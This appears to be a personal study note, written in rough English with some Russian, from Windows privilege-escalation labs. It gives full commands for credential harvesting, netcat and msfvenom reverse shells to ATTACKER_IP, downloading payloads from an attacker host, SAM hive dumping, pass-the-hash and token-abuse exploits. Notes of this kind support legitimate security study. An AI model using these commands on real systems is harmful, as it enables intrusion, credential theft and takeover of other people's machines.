[[Windows Внутрянка]] [[Powershell]] [[cmd.exe]] 
#### Little Theory about win 
Users in win 
<mark style="background: #FFF3A3A6;">Admins</mark> - max privilege, can change parametrs of system and can rwe every files
<mark style="background: #FFF3A3A6;">Users</mark> - can use PC but can do only specail thing like files, dont change critical system variables, can edit only personal files

Specail Local users 
<mark style="background: #FFF3A3A6;">SYSTEM / LocalSystem</mark> - account which OS use for execute system process. Its often has more rights than admins
<mark style="background: #FFF3A3A6;">Local Service</mark> - standart account for start Windiws with minimal rights. Use anonim connections in the network
<mark style="background: #FFF3A3A6;">Network Sevice</mark> - standart account for start windiws, use accounts data for autentification computer in the network

#### First steps

Automatical douwnload in windows 
often when windows setup on many hosts admins can use <mark style="background: #BBFABBA6;">Deployment Services</mark> which gives open one image OS on several hosts name of this it's - <mark style="background: #BBFABBA6;">unattented installations</mark> becuase its do all without user

For first steps need admins account and data can be here
``` cmd
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

example what can be in the file:
```cmd
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

#### Powershell
all commands what was used will be in the special file, u can take data with cmd just use this
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
<mark style="background: #D00C0CA6;">ATTENTION - use only in cmd!!</mark> because powershell think what %userprofile% it's variable

#### Saved accounts
windows can save users data and after use it, to show this data use command:
```cmd
cmdkey /list
```
Answer will be something like this
```cmd
Currently stored credentials:

    Target: Domain:interactive=THM\admin
    Type: Domain Password
    User: THM\admin

    Target: Domain:interactive=THM\backup
    Type: Domain Password
    User: THM\backup
```
and after we can use this data to start programs from user what we can use
```cmd
C:\> runas /savecred /user:THM\admin cmd.exe
```

#### IIS configuration
<mark style="background: #BBFABBA6;">Internet Information System(IIS)</mark> - standart web server in windows, Configuration IIS sites storage in `web.config` where can be passwords for databases or authethication algoritms.
From version IIS file `web.config` can be in several places
```cmd
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
<mark style="background: #D00C0CA6;">fast cscript to find </mark>
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

#### Take data from programs: PuTTY
<mark style="background: #BBFABBA6;">PuTTY</mark> - ssh clien what u can often meet in windows. Users can save paramets theirs session (IP, username, over options). 
PuTTY can dont save ssh-passwords but its save proxy options, data for login in clear text
If u want to take saved proxy data use this:
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

#### Planned tasks (Scheduled Tasks)
when we see planned tasks we can find tasks whose hasnt got bin fail what it must do or we u can change data in this file
all tasks u can see so:
```cmd
schtasks
```
if u want to see more information about specific task use this
```cmd
schtasks /query /tn task_name /fo list /v
```
<mark style="background: #FFF3A3A6;">exaple</mark> of what we will see
```cmd
Folder: \
HostName:                             THM-PC1
TaskName:                             \exaple_task
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
we must to check two parametrs:
`Task to run` - what the file will start task
`Run As User`- from which name it will start
if ur user can change bin file of task we can control what will be start in the system
check rools for file
```cmd
icacls C:\tasks\schtask.bat
```
what we can see:
```cmd
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)
                     BUILTIN\Users:(I)(F)
```
from this example we can see what group BUILTIN\Users have full acess (F) its mean what we can change schtasks.bat and paste in this file every useful code
<mark style="background: #FFF3A3A6;">Attack example</mark>
we will use predicteble path from lab and use cmd script
```cmd
echo c:\tools\nc64.exe - e cmd.exe ATTACKER_IP ATTACKER_PORT > С:\]tasks\schtasks.bat
```
`c:\tools\nc64.exe` - exe for netcat in windows
`-e cmd` - -e say netcat what after connection u must start `cmd.exe` and connect input/output for this network connection
on attacker machine we will start [[NetCat]] 
```shell
nc -lvnp ATTACKER_PORT
```
and after tasks start we can see reverce-shell
if u wont'wait when u can use
```cmd
schtasks /run /tn exaple_task
```

 AlwaysInstallElevented
 file of windows downoader (.msi) usually start with rights what have accaunt but we can use special settings, which gives start it with more powerful privilege by every account
 its gives to generate our `.msi` file which will start with admins rights
 for start explotation need: two reestrs must insteled
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
and two notes must be active
if we have vulnsbility we can generate `.msi` from `msfvenov` from attacker machine
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
after this we must open Metaspoit and use this
```shell
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST ATTACKING_MACHINE_IP
set LPORT ATTACKER_PORT
run
```
now its waiting connection, after we must deliver `malcious.msi` on win host
we have 2 ways how we can do it
1 - from `upload` in Meterprenter
2 - `certutil.exe -urlcache -f http://IP/malicious.msi malicious.msi` 
Start on win host
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

#### Windows Servives
All services(background processes) control from <mark style="background: #BBFABBA6;">Service Control Manager(SCM)</mark> 
<mark style="background: #BBFABBA6;">SCM do:</mark>
- start/stop services 
- check condition
- storage configuration
Every service has got own `.exe` file what will be in configuretion and start on account
<mark style="background: #FFF3A3A6;">example:</mark> LocalSystem, Administrator, svcuser1
<mark style="background: #ADCCFFA6;">Note:</mark> no every `.exe` can registrate how service - executable file must can "communicate" with SCM from special functions
<mark style="background: #FFF3A3A6;">example of check configuration</mark> use this for service
```cmd
sc qc apphostsvc #example of program
```
`sc` - service control
`qc` - Query Config - ask configuration
what we will see after
```cmd
SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        DISPLAY_NAME       : Application Host Helper Service
        SERVICE_START_NAME : LocalSystem
```
Key strings what we must search it's 
`BINARY_PATH_NAME` - path to executable file
`SERVICE_START_NAME` - account from service work(exaple: `LocalSystem` = max rights)
Configurations of services we can found in register
```cmd
HKLM\SYSTEM\CurrentControlSet\Services\
```
in every dir
`ImagePath` - path to `.exe`
`ObjectName` - from whic account service start
`Security` - DACL - list of rights
<mark style="background: #ADCCFFA6;">Note:</mark> Only admins can change this variables!

<mark style="background: #FFF3A3A6;">Explatation example 1</mark> 
Insecure Permission on Service Executable
<mark style="background: #D2B3FFA6;">first step</mark> - check vulnaburity 
if  service's `.exe` file has got so low rights(example: u can change it) - so easy explotation
first check it
```cmd
sc qc WindowsScheduler
```
answer:
```cmd
SERVICE_NAME: windowsscheduler
BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
SERVICE_START_NAME : .\svcuser1
```
service started from `svcuser1`, binary: `C:\PROGRA~2\SYSTEM~1\WService.exe`
now check rights:
```cmd
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
aswer
```cmd
Everyone:(I)(M)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
```
`Everyone:(I)(M)` = every user can change `.exe` file -> we can change binary file
<mark style="background: #D2B3FFA6;">Explotation</mark>
on ATTCKER_PC we must create payload
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe-service -o rev-svc.exe
```
`-p` - payload
`-f exe-service` - format executable file
`-o` - file to save

after we must start python seerver
```shell
python -m http.server port_on_attacer_machine
```
on attacked PC we must downolad this 
```powershell
wget http://ATTACKER_IP:port_on_attacer_machine/rev-svc.exe -O rev-svc.exe
```
after moved binary
```cmd
move WService.exe WService.exe.bkp #save backup of file
move rev-svc.exe WService.exe #rename our file
icacls WService.exe /grant Everyone:F #
```
- `icacls` — инструмент для управления списками доступа (ACL) к файлам.
- `/grant` — выдать права.
- `Everyone:F` → всем пользователям (`Everyone`) дать полный доступ (**F = Full control**).
Зачем это нужно:
Иногда сервис запускается от имени учётки, у которой нет прав на выполнение или доступ к новому файлу.
Мы гарантируем, что любой пользователь (включая сервисную учётку) сможет **запускать, читать, изменять** этот файл.
Это повышает вероятность успешного запуска payload’а.
next step on ATTACKER PC use [[NetCat]] 
```shell
nc -lnvp ATTACKER_PORT
```
and the last, restart the service and after take shell from svcuser1
```cmd
sc stop windowsscheduler
sc start windowsscheduler
```

<mark style="background: #FFF3A3A6;">Example 2 Unquoted Service Paths</mark>
If in `BINARY_PATH_NAME` path will be with caps and without "path to file", SCM can incorect understan what path
example
```cmd
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```
SCM can run 
`C:\MyPrograms\Disk.exe` or `C:\MyPrograms\Disk Sorter.exe`
Usage
1 check the path
```cmd
sq qc "disk sorter enterprise"
```
after check th catalog
```cmd
icacls C:\MyPrograms
```
make a payload on ATTACKER PC
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe-service -o rev-svc2.exe
```
dounload on target PC and move in right place
```cmd
move rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```
restart the process
```cmd
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```
after that we can take a reverse-shell

<mark style="background: #FFF3A3A6;">Exaple 3 Insecure Service Permissions</mark>
if executable file safety we can use itif DACL own service can change it
check this vulnability
```cmd
accesschk64.exe -qlc thmservice
```
if we can see `BUILTIN\Users` -> SERVICE_ALL_ACCESS - what's mean what everybody can change it
Usage
1 make a payload on kali
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe-service -o rev-svc3.exe
```
2 download on target and use icacls
```cmd
icacls rev-svc3.exe /grant Everyone:F
```
3 after we must change configuration of service
```cmd
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```
4 restart service
```
sc stop THMService
sc start THMService
```
after we take shell from NT AUTHTORITY\SYSTEM

#### Windiws Privileges
Privileges - specail rights which gives fpr Windows account
They give to do system operations for example:
turn on/off computer
Ignore DACL(списки доступа)
make backups system files
give rights owner of object
change the user
Every account in Windows has got privileges u can chrck it use the comman 
```cmd
whoami /priv
```
what u can see
```cmd
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
```
Nmae - system name of privilege
Description  what is to do
State - condition (Enable/Disable)
NOTE: not every privileges need for attacker, main interes: can upgrade ur privileges to SYSTEM or ADMIN. Full list of rhis u can find here: #Priv2Admin  

 #### SeBackup/SeRestore
 This privileges give read and write in every file in system ignore DACL
 use Admins and operators to make a backups
 For attacktr its mean - u can copy critical files (SAM and SYSTEM) and take from this hashes of passwords
 step of explotation
 1 Check privilege
 ```cmd
 whoami /priv
 ```
 after u can see
 ```cmd
 PRIVILEGES INFORMATION
----------------------
SeBackupPrivilege   Back up files and directories   Disabled
SeRestorePrivilege  Restore files and directories   Disabled
SeShutdownPrivilege Shut down the system            Disabled
SeChangeNotifyPrivilege Bypass traverse checking    Enabled
 ```
 interesting we see what `SeBackupPrivilege` and `SeRestorePrivilege` if they disabled we can execute cmd from amdin 
 2 Save SAM and SYSTEM
 ```cmd
 reg save hklm\system C:\Users\THMBackup\system.hive
 reg save hklm\sam C:\Users\THMBackup\sam.hive
 ```
 `reg save` - save part of register in the file
 `hklm\system` - SYSTEM hiv - keys for encryption of hashes
 `hklm\sam` - SAM hive - hashes of users passwords
 3 after need to start SMB-server on kali use for this
 ```shell
 mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
 ```
 SMB started and we can connect to it from windows
 4 copy files from windows on machine
 ```cmd
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
 ```
 5 take hashes with secretsdump
 ```shell
 python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
 ```
 `-sam` - way to SAM hive
 `-system` - way to SYSTEM hive
 `LOCAL` - take local hashes
 what we will see after: 
 ```shell
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 6 Pass-the-hash - autethication without password
 use psexec
 ```shell
 python3.9 /opt/impacket/examples/psexec.py -hashes aad3...:13a04cd... administrator@MACHINE_IP
 ```
 and after u are welcome to reverse shell

#### SeTakeOwnership
Gives rights to be the owner of every object on PC
new owner can take a full control
Ussualy use: utilman.exe - programm special rights on block screen
explotation
Check the privilege
```cmd
whoami /priv
```
what we can see
```cmd
SeTakeOwnershipPrivilege   Take ownership of files or other objects   Disabled
```
2 next step we change owner of system file `C:\Windows\System32\Utilman.exe` use for this command `takeown`
```cmd
takeown /f C:\Windows\System32\Utilman.exe
```
`takeown` - application in windows which change owner of file or dir
`/f` - link on file
after execute we must see
```cmd
SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```
3 give full control for iur account
if u owner of file its doesn mean what u can change file but u can give a permission to do it for this w ewill use `icacls`
```cmd
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```
`icacls` - tool of control ACL (правами доступа)
`/grant` - gives user rights
`THMTakeOwnership` - users name
`F` - Full Control
after u must see
```cmd
Successfully processed 1 files
```
now we have full control on utilman.exe
4 change the file ultimate.exe
we will use cmd.xexe because its so comfortable with SYSTEM rights
check this
```cmd
whoami
```

#### SeAssignPrimaryToken
in windiws we have concept of security token - this object its which gives information about user and what he can do
When process start its working with with this token if process get another token he can execute from another user
Explotation
1 step check priv
```cmd
whoami /priv
```
2 get ready to listen on kali
```cmd
nc -lvnp ATTACKER_PORT
```
3 start exploit on target machine(on thm we have it on machine)
```cmd
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP ATTACKER_PORT"
```
`RogueWinRM.exe` - exploit
`-p` - program which need to start after take a token we must use `nc64.exe`
`-a` - arguments form progreamm
`-e cmd.exe` - after start u must start cmd.exe ond send input/output on network connection
`ATTACKER_IP` - connect to IP on ATTACKER_PORT
and after this we can see revers-shell

#### Unpatched Sofware

Programs what installed on target machine often give way to privilege escalation
Users and Admins update OS more often when applications -> hacked version is more longer be on target machine
instrument wmic - cammand for list of downloaded versions and apllications
```powershell
wmic product get name,version,vendor
```
`wmic product` - show only them applications what registrated from Windows Installer (MSI), many programs installed another and them not be in this list
example of answer from `wmic`
```cmd
Name                                   Version        Vendor
Microsoft Visual C++ 2015-2019 Redis... 14.28.29325.0 Microsoft Corporation
Druva inSync                            6.6.3         Druva
7-Zip 19.00                             19.00         Igor Pavlov
```
if wmic dont give information about needed product - search this:
icons `dir "C:\Users\Public\Desktop" /s`
services `sc queryex type= service state= all`
processes `tasklist /v` or in powershell `Get-Process | Sort-Object -Property ProcessName`
register `reg query "HKLM\SOFTWARE" /s | findstr /i "<имя>"`
Find exploits from version
use not only one variant of search version 
- `"<Product Name>" "<Version>" exploit`
- `"<Product Name>" "<Version>" "privilege escalation"`
- `"<Product Name>" "<Version>" "CVE"`
- `"<Product Name>" rpc 6064 exploit` (если знаешь порт/протокол)
- `"<Product Name>" path traversal inSync exploit` (по ключевым словам уязвимости)
Where find exploits [[links on useful data]]

#### Useful progams autocheck
WinPEAS - https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
```cmd
C:\> winpeas.exe > outputfile.txt
```
can use exe or .bat script

PrivessCheck - https://github.com/itm4n/PrivescCheck
Powershell script which search popylarity ways to escalate privilegion
its similar with WinPEAS but
u can start this program with для того чтобы обойти политику исполнения но можно попробовать и без нее
```cmd 
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

WES-NG: Windows Exploit Suggester — Next Generation - https://github.com/bitsadmin/wesng
python script which run on kali. Before use do this command
```shell
wes.py --update
```
for use this script we must do `systeminfo` on target PC and and send wtitten in .txt file
and after this we can start
```shell
wes.py sysexample.txt
```

Metasploit
if u have got meterprenter session u can use modul
```shell
multi/recon/local_exploit_suggester
```
for check vulnaburites